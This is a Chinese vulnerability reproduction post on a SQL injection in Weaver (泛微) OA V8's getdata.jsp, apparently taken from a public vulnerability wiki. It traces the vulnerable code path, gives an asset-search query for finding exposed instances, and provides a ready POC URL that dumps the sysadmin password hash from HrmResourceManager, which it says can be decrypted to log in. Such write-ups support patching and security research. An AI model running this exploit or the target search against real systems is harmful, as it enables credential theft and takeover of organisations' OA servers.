---
title: "泛微OA V8 getdata.jsp SQL注入漏洞"
date: 2026-10-17 09:12:44
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "SQL注入"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限

## 漏洞影响

```
泛微OA V8
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

在getdata.jsp中，直接将request对象交给

**weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) :** 

方法处理

![image-20220209104257902](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091042978.png)

在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法

![image-20220209104319947](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091043985.png)

Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)

在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中

![image-20220209104335191](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091043319.png)

根据以上代码流程，只要构造请求参数

?cmd= getSelectAllId&sql=select password as id from userinfo;

即可完成对数据库操控

POC

```plain
http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）

![image-20220209104351654](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091043694.png)解密后即可登录系统

![image-20220209104408461](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091044509.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-getdata.jsp-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
